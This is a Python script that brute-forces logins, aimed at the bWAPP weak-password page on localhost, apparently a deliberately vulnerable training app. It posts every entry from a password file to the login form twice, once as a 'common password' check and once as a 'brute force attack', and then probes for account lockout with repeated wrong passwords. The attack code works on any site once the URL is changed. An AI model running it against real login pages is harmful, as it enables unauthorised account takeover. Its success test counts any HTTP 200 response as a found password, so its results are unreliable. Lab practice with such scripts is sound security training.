import requests
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Function to load passwords from a file
def load_passwords(file_path):
    with open(file_path, 'r') as file:
        passwords = file.read().splitlines()
    return passwords

# Function to check for common weak passwords
def check_common_passwords(url, username, passwords):
    results = []
    for password in passwords:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Weak password found: {password}")
            break
    return results

# Brute force attack simulation
def brute_force_attack(url, username, password_list):
    results = []
    for password in password_list:
        response = requests.post(url, data={'username': username, 'password': password})
        if response.status_code == 200:
            results.append(f"Password found: {password}")
            break
    return results

# Checking for account lockout mechanism
def check_account_lockout(url, username):
    results = []
    for i in range(10):
        response = requests.post(url, data={'username': username, 'password': 'wrongpassword'})
        if response.status_code == 429:  # Too Many Requests
            results.append("Account lockout mechanism detected.")
            break
    if not results:
        results.append("No account lockout mechanism detected.")
    return results

# Combine functions and execute
def main():
    target_url = "http://localhost/bWAPP/ba_weak_pwd.php"
    username = 'bee'
    password_file = 'common-password.txt'
    
    # Load passwords from file
    passwords = load_passwords(password_file)
    
    # Check for common weak passwords
    common_password_results = check_common_passwords(target_url, username, passwords)
    
    # Simulate brute force attack
    brute_force_results = brute_force_attack(target_url, username, passwords)
    
    # Check for account lockout mechanism
    account_lockout_results = check_account_lockout(target_url, username)
    
    # Print all results separately
    print("Common Password Check Results:")
    for result in common_password_results:
        print(result)
    
    print("\nBrute Force Attack Results:")
    for result in brute_force_results:
        print(result)
    
    print("\nAccount Lockout Check Results:")
    for result in account_lockout_results:
        print(result)
        
if __name__ == "__main__":
    main()
